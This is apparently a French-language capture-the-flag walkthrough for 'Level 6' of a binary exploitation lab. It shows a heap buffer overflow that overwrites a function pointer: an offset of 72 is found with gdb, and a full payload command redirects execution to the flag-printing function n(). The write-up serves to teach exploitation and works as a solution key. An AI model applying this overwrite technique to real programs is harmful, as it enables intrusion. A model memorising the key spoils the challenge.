### Level 6

#### Etape 01 :

On identifie la fonction importante : `n()`.

- `n()` permet d'obtenir le flag.
- Le but est donc de forcer le programme a executer `n()`.

#### Etape 02 :

En analysant le code, on voit que :

- notre argument est copie dans un buffer alloue dynamiquement (`malloc(64)`),
- un pointeur de fonction (initialement sur `m()`) est ensuite appele.

L'idee est de faire un **buffer overflow** pour ecraser ce pointeur de fonction et y placer l'adresse de `n()`.

#### Etape 03 :

Il faut trouver l'offset exact pour atteindre le pointeur de fonction.

Comme le buffer fait 64 octets, on commence autour de cette valeur, puis on ajuste.

Apres test, l'offset correct est `72`.

Exemple de test das gdb :

```bash
./level6 $(python -c 'print "e" * 72')
```

#### Etape 04 :

On recupere l'adresse de `n()` :

```text
0x08048454
```

En little-endian, cela donne : `\x54\x84\x04\x08`.

#### Etape 05 :

On construit le payload :

- 72 caracteres de remplissage,
- puis l'adresse de `n()` pour ecraser le pointeur de fonction.

```bash
./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
```

Le programme saute alors dans `n()` et le flag apparait.
